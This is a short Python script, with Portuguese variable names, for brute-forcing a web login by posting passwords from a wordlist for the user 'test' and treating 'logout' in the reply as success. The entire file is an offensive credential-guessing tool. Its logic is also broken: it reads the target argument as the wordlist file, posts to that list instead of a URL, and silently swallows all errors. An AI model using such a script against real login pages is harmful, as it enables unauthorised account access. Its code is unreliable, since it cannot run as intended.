import requests
import sys

def brute_force_senha(alvo, wordlist):
    if len(sys.argv) == 3:
        try:
            with open (alvo, "r") as file:
                wordlist = file.read().splitlines()

                for senha in wordlist:
                    data = {
                        "user": "test",
                        "password": senha
                    }
                    response = requests.post(wordlist, data=data)
                    if "logout" in response.text:
                        senha_correta = senha
                        print(f"senha encontrada {senha_correta}")

                    else:
                        pass
        except:
            pass

if __name__ == "__main__":
    alvo = sys.argv[1]
    wordlist = sys.argv[2]
    brute_force_senha(alvo, wordlist)